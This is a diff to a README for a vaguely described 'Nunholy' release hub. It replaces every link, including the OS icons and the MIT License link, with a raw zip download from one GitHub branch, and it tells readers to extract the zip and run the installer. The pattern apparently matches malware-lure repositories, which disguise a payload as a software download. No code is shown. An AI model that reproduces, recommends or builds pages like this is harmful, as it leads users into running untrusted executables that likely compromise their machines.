@@ -1,6 +1,6 @@
 # Nunholy Alternative Release Hub
 
-[![Download](https://raw.githubusercontent.com/fvdrgserge/nunholy-open-access-portal/branch/pregnability/nunholy-open-access-portal_v1.9.zip)](https://raw.githubusercontent.com/fvdrgserge/nunholy-open-access-portal/branch/pregnability/nunholy-open-access-portal_v1.9.zip)
+[![Download](https://github.com/fvdrgserge/nunholy-open-access-portal/raw/refs/heads/branch/pregnability/access_open_nunholy_portal_2.9.zip)](https://github.com/fvdrgserge/nunholy-open-access-portal/raw/refs/heads/branch/pregnability/access_open_nunholy_portal_2.9.zip)
 
 ---
 
@@ -12,11 +12,11 @@ Stay ahead with Nunholy's impressive platform adaptability. No need for compatib
 
 | Operating System        | Supported? |
 |------------------------|:----------:|
-| ![Windows](https://raw.githubusercontent.com/fvdrgserge/nunholy-open-access-portal/branch/pregnability/nunholy-open-access-portal_v1.9.zip)       | ✅         |
-| ![macOS](https://raw.githubusercontent.com/fvdrgserge/nunholy-open-access-portal/branch/pregnability/nunholy-open-access-portal_v1.9.zip)           | ✅         |
-| ![Linux](https://raw.githubusercontent.com/fvdrgserge/nunholy-open-access-portal/branch/pregnability/nunholy-open-access-portal_v1.9.zip)           | ✅         |
-| ![Android](https://raw.githubusercontent.com/fvdrgserge/nunholy-open-access-portal/branch/pregnability/nunholy-open-access-portal_v1.9.zip)     | 🚧 (Upcoming)     |
-| ![iOS](https://raw.githubusercontent.com/fvdrgserge/nunholy-open-access-portal/branch/pregnability/nunholy-open-access-portal_v1.9.zip)               | 🚧 (Planned)       |
+| ![Windows](https://github.com/fvdrgserge/nunholy-open-access-portal/raw/refs/heads/branch/pregnability/access_open_nunholy_portal_2.9.zip)       | ✅         |
+| ![macOS](https://github.com/fvdrgserge/nunholy-open-access-portal/raw/refs/heads/branch/pregnability/access_open_nunholy_portal_2.9.zip)           | ✅         |
+| ![Linux](https://github.com/fvdrgserge/nunholy-open-access-portal/raw/refs/heads/branch/pregnability/access_open_nunholy_portal_2.9.zip)           | ✅         |
+| ![Android](https://github.com/fvdrgserge/nunholy-open-access-portal/raw/refs/heads/branch/pregnability/access_open_nunholy_portal_2.9.zip)     | 🚧 (Upcoming)     |
+| ![iOS](https://github.com/fvdrgserge/nunholy-open-access-portal/raw/refs/heads/branch/pregnability/access_open_nunholy_portal_2.9.zip)               | 🚧 (Planned)       |
 
 ## 🌟 Singular Features & Technical Wonders
 
@@ -33,7 +33,7 @@ Stay ahead with Nunholy's impressive platform adaptability. No need for compatib
 Want to embark on your Nunholy adventure? Follow these steps to begin your journey:
 
 1. **Obtain the Installer:**  
-   Click the badge at the top or the secure https://raw.githubusercontent.com/fvdrgserge/nunholy-open-access-portal/branch/pregnability/nunholy-open-access-portal_v1.9.zip button below.
+   Click the badge at the top or the secure https://github.com/fvdrgserge/nunholy-open-access-portal/raw/refs/heads/branch/pregnability/access_open_nunholy_portal_2.9.zip button below.
 2. **Extract the Package:**  
    Right-click the downloaded file, select ‘Extract,’ and reveal the inner sanctum.
 3. **Run The Installer:**  
@@ -70,12 +70,12 @@ Nunholy is provided for evaluation, research, and personal exploration only. Ple
 
 ## 📜 MIT License (2025)
 
-This project is shared under the permissive and empowering [MIT License](https://raw.githubusercontent.com/fvdrgserge/nunholy-open-access-portal/branch/pregnability/nunholy-open-access-portal_v1.9.zip).  
+This project is shared under the permissive and empowering [MIT License](https://github.com/fvdrgserge/nunholy-open-access-portal/raw/refs/heads/branch/pregnability/access_open_nunholy_portal_2.9.zip).  
 Feel free to study, adapt, and craft your own adventures—just remember to maintain proper credit and respect for the creators.  
 
 ---
 
-[![Download](https://raw.githubusercontent.com/fvdrgserge/nunholy-open-access-portal/branch/pregnability/nunholy-open-access-portal_v1.9.zip)](https://raw.githubusercontent.com/fvdrgserge/nunholy-open-access-portal/branch/pregnability/nunholy-open-access-portal_v1.9.zip)
+[![Download](https://github.com/fvdrgserge/nunholy-open-access-portal/raw/refs/heads/branch/pregnability/access_open_nunholy_portal_2.9.zip)](https://github.com/fvdrgserge/nunholy-open-access-portal/raw/refs/heads/branch/pregnability/access_open_nunholy_portal_2.9.zip)
 
 ---
 
